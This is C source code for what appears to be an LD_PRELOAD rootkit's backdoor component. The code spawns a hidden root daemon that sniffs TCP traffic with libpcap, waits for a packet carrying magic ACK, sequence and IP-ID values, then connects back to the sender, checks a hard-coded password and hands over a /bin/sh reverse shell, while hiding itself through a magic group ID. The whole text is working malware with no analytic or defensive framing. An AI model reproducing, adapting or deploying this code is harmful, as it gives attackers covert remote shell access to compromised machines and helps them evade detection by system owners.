void backconnect(struct in_addr addr, u_short port){
    pid_t pid = fork();
    if(pid < 0) return;
    else if(pid > 0){
        wait(NULL);
        return;
    }

    if(setsid() < 0)
        exit(0);

    hook(CSOCKET, CSETGID, CCHDIR, CREAD);
    signal(SIGHUP, SIG_IGN);
    call(CSETGID, getgid()+1);

    char *target = inet_ntoa(addr), tmp[128];
    struct sockaddr_in sa;
    int s, got_pw;

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(target);
    sa.sin_port = port;

    s = (long)call(CSOCKET, AF_INET, SOCK_STREAM, 0);
    if(s < 0)
        exit(0);
    
    if(connect(s, (struct sockaddr *)&sa, sizeof(sa)) < 0){
        shutdown(s, SHUT_RDWR);
        close(s);
        exit(0);
    }

    send(s, ": ", 2, 0);
    memset(tmp, 0, sizeof(tmp));
    call(CREAD, s, tmp, sizeof(tmp)-1);
    tmp[strlen(tmp)-1]='\0';
    got_pw = !strcmp(crypt(tmp, BACKDOOR_PASS), BACKDOOR_PASS);
    if(!got_pw){
        shutdown(s, SHUT_RDWR);
        close(s);
        exit(0);
    }

    for(int i=0; i<3; i++)
        dup2(s, i);

    call(CCHDIR, HOMEDIR);
    system("./bdvprep;id;w");
    execl("/bin/sh", "sh", NULL);
    shutdown(s, SHUT_RDWR);
    close(s);
    exit(0);
}

void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet){
    /* declare pointers to packet headers */
    const struct sniff_ip *ip;   /* The IP header */
    const struct sniff_tcp *tcp; /* The TCP header */

    int size_ip, size_tcp;
    unsigned int r_ack, r_seq;
    unsigned short r_id;

    /* define/compute ip header offset */
    ip = (struct sniff_ip *)(packet + SIZE_ETHERNET);
    if(ip->ip_p != IPPROTO_TCP) return;

    size_ip = IP_HL(ip) * 4;
    if(size_ip < 20) return;

    /* define/compute tcp header offset */
    tcp = (struct sniff_tcp *)(packet + SIZE_ETHERNET + size_ip);
    size_tcp = TH_OFF(tcp) * 4;
    if(size_tcp < 20) return;

    preparehideports(readgid());
    if(is_hidden_port(htons(tcp->th_sport))){
        r_ack = ntohl(tcp->th_ack);
        r_seq = ntohl(tcp->th_seq);
        r_id = ntohs(ip->ip_id);
        if((r_ack == MAGIC_ACK && r_seq == MAGIC_SEQ && r_id == MAGIC_ID))
            backconnect(ip->ip_src, tcp->th_sport);
    }
}

int pdoorup(void){
    int status = 0;
    struct dirent *dir;
    DIR *dp;
    struct stat procstat;
    gid_t magicgid = readgid();

    if(getgid() == magicgid-1)
        return 1;

    hook(COPENDIR, CREADDIR, C__XSTAT);

    dp = call(COPENDIR, "/proc");
    if(dp == NULL) return 0;

    while((dir = call(CREADDIR, dp)) != NULL){
        if(!strcmp(dir->d_name, ".\0") || !strcmp(dir->d_name, "..\0"))
            continue;

        char procpath[7+strlen(dir->d_name)];
        snprintf(procpath, sizeof(procpath), "/proc/%s", dir->d_name);
        memset(&procstat, 0, sizeof(struct stat));

        if((long)call(C__XSTAT, _STAT_VER, procpath, &procstat) < 0)
            continue;

        if(procstat.st_gid == magicgid-1){
            status = 1;
            break;
        }
    }

    closedir(dp);
    return status;
}

void spawnpdoor(void){
    if(pdoorup() || getgid() != 0)
        return;

    unsetenv("LD_PRELOAD");

    pid_t pid = fork();
    if(pid != 0)
        return;

    umask(0);
    if(setsid() < 0)
        exit(0);

    /* close all open fds */
    for(int i=sysconf(_SC_OPEN_MAX); i>=0; i--)
        close(i);

    signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);

    hook(CSETGID);
    /* this process is super special */
    if((long)call(CSETGID, readgid()-1) < 0)
        exit(0);

    pid = fork();
    if(pid != 0) exit(0);

    char *dev = NULL;              /* capture device name */
    char errbuf[PCAP_ERRBUF_SIZE]; /* error buffer */
    pcap_t *handle;                /* packet capture handle */
    char filter_exp[] = "tcp";     /* filter expression [*/
    struct bpf_program fp;         /* compiled filter program (expression) */
    bpf_u_int32 mask;              /* subnet mask */
    bpf_u_int32 net;               /* ip */
    int num_packets = 0;           /* Capture indefinitely */

#ifdef TARGET_DEVICE
    dev = TARGET_DEVICE;
#else
    pcap_if_t *intf;
    int rfind = pcap_findalldevs(&intf, errbuf);
    if(rfind < 0){
        //printf("Couldn't find devices: %s\n", errbuf);
        exit(0);
    }
    dev = intf->name;
#endif

    /* get network number and mask associated with capture device */
    if(pcap_lookupnet(dev, &net, &mask, errbuf) < 0){
        //printf("Couldn't get netmask for device %s: %s\n", dev, errbuf);
        net = 0;
        mask = 0;
    }

    /* print capture info */
    //printf("Device: %s\n", dev);
    //printf("Filter expression: %s\n", filter_exp);

    /* open capture device */
    handle = pcap_open_live(dev, MAX_CAP, 0, 1000, errbuf);
    if(handle == NULL){
        //printf("Couldn't open device %s: %s\n", dev, errbuf);
        exit(0);
    }

    /* make sure we're capturing on an Ethernet device [2] */
    if(pcap_datalink(handle) != DLT_EN10MB){
        //printf("%s is not an Ethernet\n", dev);
        exit(0);
    }

    /* compile the filter expression */
    if(pcap_compile(handle, &fp, filter_exp, 0, net) == -1){
        //printf("Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
        exit(0);
    }

    /* apply the compiled filter */
    if(pcap_setfilter(handle, &fp) == -1){
        //printf("Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
        exit(0);
    }

    /* now we can set our callback function */
    pcap_loop(handle, num_packets, got_packet, NULL);

    /* cleanup */
    pcap_freecode(&fp);
    pcap_close(handle);
    exit(0);
}